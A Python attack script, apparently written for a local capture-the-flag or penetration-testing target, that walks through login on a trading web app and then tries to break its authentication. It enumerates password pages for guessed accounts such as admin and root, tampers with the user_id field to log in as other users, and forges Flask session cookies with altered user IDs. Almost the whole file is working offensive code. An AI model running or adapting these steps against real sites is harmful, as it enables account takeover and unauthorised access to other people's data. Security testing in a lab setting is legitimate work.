import requests
import re
import base64
import json
import sys

def print_section(title):
    print(f"\n{'='*60}")
    print(f" {title}")
    print(f"{'='*60}")

# Create session with browser-like headers
session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1'
})

# Step 1: Initial Login Page
print_section("STEP 1: INITIAL LOGIN PAGE")
try:
    resp1 = session.get('http://127.0.0.1:32783/', timeout=10)
    print(f"[+] GET http://127.0.0.1:32783/")
    print(f"[+] Status Code: {resp1.status_code}")
    print(f"[+] Response Headers: {dict(resp1.headers)}")
    print(f"[+] Cookies: {dict(session.cookies)}")
    
    # Look for CSRF tokens or hidden fields
    csrf_match = re.search(r'name="csrf_token" value="([^"]+)"', resp1.text)
    hidden_fields = re.findall(r'<input[^>]*type="hidden"[^>]*>', resp1.text)
    print(f"[+] CSRF Token: {csrf_match.group(1) if csrf_match else 'NOT FOUND'}")
    print(f"[+] Hidden fields found: {len(hidden_fields)}")
    for field in hidden_fields:
        print(f"  - {field}")
    
    print(f"[+] Response Body (first 500 chars):\n{resp1.text[:500]}")
except Exception as e:
    print(f"[-] Error in Step 1: {e}")
    sys.exit(1)

# Step 2: Username Submission
print_section("STEP 2: USERNAME SUBMISSION")
try:
    login_data = {'username': 'test'}
    resp2 = session.post('http://127.0.0.1:32783/', data=login_data, allow_redirects=True, timeout=10)
    
    print(f"[+] POST http://127.0.0.1:32783/ with username='test'")
    print(f"[+] Status Code: {resp2.status_code}")
    print(f"[+] Redirect History: {[r.status_code for r in resp2.history]}")
    print(f"[+] Final URL: {resp2.url}")
    print(f"[+] Cookies after login: {dict(session.cookies)}")
    
    # Extract user_id from the password page
    user_id_match = re.search(r'name="user_id" value="([^"]+)"', resp2.text)
    username_match = re.search(r'name="username" value="([^"]+)"', resp2.text)
    
    user_id = user_id_match.group(1) if user_id_match else None
    username = username_match.group(1) if username_match else 'test'
    
    print(f"[+] Extracted user_id: {user_id}")
    print(f"[+] Extracted username: {username}")
    print(f"[+] Response Body (first 500 chars):\n{resp2.text[:500]}")
    
except Exception as e:
    print(f"[-] Error in Step 2: {e}")
    sys.exit(1)

# Step 3: Password Submission
print_section("STEP 3: PASSWORD SUBMISSION")
try:
    if not user_id:
        print("[-] Could not extract user_id, skipping password submission")
    else:
        password_data = {
            'password': 'test',
            'username': username,
            'user_id': user_id
        }
        
        resp3 = session.post(resp2.url, data=password_data, allow_redirects=True, timeout=10)
        
        print(f"[+] POST {resp2.url} with password='test'")
        print(f"[+] Status Code: {resp3.status_code}")
        print(f"[+] Redirect History: {[r.status_code for r in resp3.history]}")
        print(f"[+] Final URL: {resp3.url}")
        print(f"[+] Cookies after password: {dict(session.cookies)}")
        
        if 'session' in session.cookies:
            session_cookie = session.cookies['session']
            print(f"[+] SESSION COOKIE RECEIVED: {session_cookie}")
        
        print(f"[+] Response Body (first 500 chars):\n{resp3.text[:500]}")
        
except Exception as e:
    print(f"[-] Error in Step 3: {e}")

# Step 4: Session Cookie Analysis
print_section("STEP 4: SESSION COOKIE ANALYSIS")
try:
    if 'session' in session.cookies:
        session_cookie = session.cookies['session']
        print(f"[+] Full session cookie: {session_cookie}")
        
        # Check Flask itsdangerous format
        if '.' in session_cookie:
            print("[+] Cookie contains dots - matches Flask itsdangerous format")
            
            # Extract payload portion (before first dot)
            payload_part = session_cookie.split('.')[0]
            print(f"[+] Payload portion (before first dot): {payload_part}")
            
            # Add proper padding for base64
            padding_needed = len(payload_part) % 4
            if padding_needed:
                payload_part += '=' * (4 - padding_needed)
            
            try:
                # Decode from URL-safe base64
                decoded_payload = base64.urlsafe_b64decode(payload_part)
                print(f"[+] Base64 decoded payload: {decoded_payload}")
                
                try:
                    # Try to parse as JSON
                    payload_str = decoded_payload.decode('utf-8')
                    session_data = json.loads(payload_str)
                    print(f"[+] Parsed session data:")
                    print(json.dumps(session_data, indent=2))
                    
                    # Extract user_id from session if present
                    if 'user_id' in session_data:
                        print(f"[+] Session user_id: {session_data['user_id']}")
                    
                except UnicodeDecodeError:
                    print("[-] Could not decode payload as UTF-8")
                except json.JSONDecodeError:
                    print("[-] Payload is valid base64 but not JSON")
                    
            except Exception as e:
                print(f"[-] Base64 decode failed: {e}")
        else:
            print("[-] Cookie doesn't contain dots - not standard Flask format")
    else:
        print("[-] No session cookie found")
        
except Exception as e:
    print(f"[-] Error in Step 4: {e}")

# Step 5: IDOR Testing
print_section("STEP 5: IDOR TESTING")

# Test 1: Direct access to different password pages
print("\n[--- Test 1: Direct access to /password/{username} endpoints ---]")
test_users = ['admin', 'test2', 'root', 'user']
for test_user in test_users:
    try:
        test_resp = session.get(f'http://127.0.0.1:32783/password/{test_user}', timeout=5)
        print(f"\n[+] GET /password/{test_user}")
        print(f"[+] Status Code: {test_resp.status_code}")
        print(f"[+] Content Length: {len(test_resp.content)} bytes")
        
        # Check for user_id field
        test_user_id = re.search(r'name="user_id" value="([^"]+)"', test_resp.text)
        if test_user_id:
            print(f"[+] user_id for {test_user}: {test_user_id.group(1)}")
        
        if test_resp.status_code == 200:
            print(f"[+] Response preview:\n{test_resp.text[:300]}")
    except Exception as e:
        print(f"[-] Error accessing /password/{test_user}: {e}")

# Test 2: Tamper user_id during password submission
print("\n[--- Test 2: Tamper user_id in password submission ---]")
if 'user_id' in locals():
    # Reset session for clean test
    test_session = requests.Session()
    test_session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    })
    
    # Get to password page
    test_session.get('http://127.0.0.1:32783/')
    login_resp = test_session.post('http://127.0.0.1:32783/', data={'username': 'test'}, allow_redirects=True)
    
    # Extract real user_id
    real_id_match = re.search(r'name="user_id" value="([^"]+)"', login_resp.text)
    real_user_id = real_id_match.group(1) if real_id_match else None
    print(f"[+] Real user_id for 'test' user: {real_user_id}")
    
    # Test tampered user_ids
    tampered_ids = [10031, 10033, 1, 9999, 0]
    
    for tampered_id in tampered_ids:
        try:
            # Create new session for each test to avoid pollution
            tamper_session = requests.Session()
            tamper_session.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
            
            # Authenticate and get to password page
            tamper_session.get('http://127.0.0.1:32783/')
            login_resp = tamper_session.post('http://127.0.0.1:32783/', data={'username': 'test'}, allow_redirects=True)
            
            # Submit with tampered user_id
            tampered_data = {
                'password': 'test',
                'username': 'test',
                'user_id': str(tampered_id)
            }
            
            tamper_resp = tamper_session.post(login_resp.url, data=tampered_data, allow_redirects=True)
            
            print(f"\n[+] Test with tampered user_id: {tampered_id}")
            print(f"[+] Status: {tamper_resp.status_code}")
            print(f"[+] Final URL: {tamper_resp.url}")
            print(f"[+] Has session cookie: {'session' in tamper_session.cookies}")
            
            if 'session' in tamper_session.cookies:
                sess_cookie = tamper_session.cookies['session']
                print(f"[+] Session cookie: {sess_cookie}")
                
                # Try to decode and see user_id
                if '.' in sess_cookie:
                    try:
                        payload_part = sess_cookie.split('.')[0]
                        padding = len(payload_part) % 4
                        if padding:
                            payload_part += '=' * (4 - padding)
                        
                        decoded = base64.urlsafe_b64decode(payload_part)
                        session_data = json.loads(decoded.decode('utf-8'))
                        
                        if 'user_id' in session_data:
                            print(f"[+] Session contains user_id: {session_data['user_id']}")
                            
                            # Check if tampering worked
                            if str(session_data['user_id']) == str(tampered_id):
                                print(f"[✓ TAMPERING SUCCESSFUL! Logged in as user_id {tampered_id}")
                            else:
                                print(f"[-] Tampering failed. Got user_id {session_data['user_id']}")
                        
                    except:
                        pass
            
            # Check response content
            if tamper_resp.status_code == 200:
                if 'trading' in tamper_resp.url:
                    print(f"[✓ LOGGED IN - redirected to trading page")
                else:
                    print(f"[+] Response preview: {tamper_resp.text[:200]}")
                    
        except Exception as e:
            print(f"[-] Error testing tampered_id {tampered_id}: {e}")

# Test 3: Try accessing trading page with tampered session
print("\n[--- Test 3: Access trading with tampered session cookie ---]")
if 'session' in session.cookies:
    original_cookie = session.cookies['session']
    
    # Create tampered session cookie
    if '.' in original_cookie:
        old_payload = original_cookie.split('.')[0]
        
        # Try to modify session data
        try:
            # Decode original
            padding = len(old_payload) % 4
            if padding:
                old_payload += '=' * (4 - padding)
            
            decoded = base64.urlsafe_b64decode(old_payload)
            session_data = json.loads(decoded.decode('utf-8'))
            
            print(f"[+] Original session data: {session_data}")
            
            # Create new session with different user_id
            for test_user_id in [10031, 10033]:
                tampered_data = session_data.copy()
                tampered_data['user_id'] = test_user_id
                
                new_payload = base64.urlsafe_b64encode(json.dumps(tampered_data).encode()).decode().rstrip('=')
                new_cookie = f"{new_payload}.{original_cookie.split('.')[1]}"
                
                print(f"\n[+] Testing tampered session for user_id {test_user_id}")
                
                # Create new session with tampered cookie
                test_sess = requests.Session()
                test_sess.headers.update({'User-Agent': 'Mozilla/5.0'})
                test_sess.cookies.set('session', new_cookie, domain='127.0.0.1')
                
                trading_resp = test_sess.get('http://127.0.0.1:32783/trading', timeout=5)
                print(f"[+] GET /trading with tampered session")
                print(f"[+] Status: {trading_resp.status_code}")
                print(f"[+] Final URL: {trading_resp.url}")
                
                if trading_resp.status_code == 200 and 'trading' in trading_resp.url:
                    print(f"[✓ SUCCESS: Accessed trading with user_id {test_user_id}")
                    print(f"[+] Trading page preview:\n{trading_resp.text[:300]}")
                else:
                    print(f"[-] Failed to access trading with tampered session")
                    
        except Exception as e:
            print(f"[-] Error creating tampered session: {e}")

print_section("TESTING COMPLETE")
print("[+] All authentication and IDOR tests finished.")
